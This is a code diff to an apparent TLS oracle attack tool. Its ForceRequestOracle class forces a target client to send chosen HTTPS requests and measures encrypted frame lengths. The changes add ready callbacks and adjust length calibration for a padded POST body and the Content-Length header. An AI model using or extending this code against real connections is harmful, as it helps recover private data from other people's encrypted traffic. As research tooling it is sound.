@@ -17,6 +17,7 @@ class ForceRequestOracle:
         self.tls_frames = []
         self.target_ip = target_client_ip
         self.base_url = b"https://" + target_server_host
+        self.ready_handler = []
 
     def start(self):
         if not self.is_started:
@@ -25,6 +26,9 @@ class ForceRequestOracle:
             self.https_server.start()
             self.is_started = True
             self._init()
+
+    def on_ready(self, callback):
+        self.ready_handler.append(callback)
 
     # This initialization step is to correctly map the force request
     # to the right TLS encrypted frame. We will force a few request of
@@ -42,7 +46,7 @@ class ForceRequestOracle:
 
         # Force the next request
         self._init_step += 1
-        self.force_request_module.force_request(self.target_ip, self.base_url + b"/" + b"A"*self._init_step, b"", self._init_callback)
+        self.force_request_module.force_request(self.target_ip, self.base_url + b"/" + b"A"*self._init_step, b"A=", self._init_callback)
 
     def _init_callback(self, id):
         for frame in self.tls_frames:
@@ -121,11 +125,17 @@ class ForceRequestOracle:
 
         # This value indicates the length of the request forced with and empty
         # URL and empty POST data.
-        self.base_length = base_size - boundary
+        self.base_length = base_size - boundary - len(b"A=")
 
         # Start the actual forced request.
         self.ready = True
         self._process_next()
+
+        for callback in self.ready_handler:
+            try:
+                callback()
+            except Exception as err:
+                logging.error(traceback.format_exc())
 
     def force_request(self, url, post_data, callback):
         # The expected length is calibrated with having a none "None" value
@@ -149,6 +159,9 @@ class ForceRequestOracle:
         # Message length
         self.expected_length = len(url) + len(post_data) - 1 + self.base_length
         
+        # Ajusting for the Content-Length header that is bigger when post_data get's bigger
+        self.expected_length += len(str(len(post_data))) - len(b"0")
+
         # Message length with the padding
         self.expected_length += self.block_size - (self.expected_length % self.block_size)
 
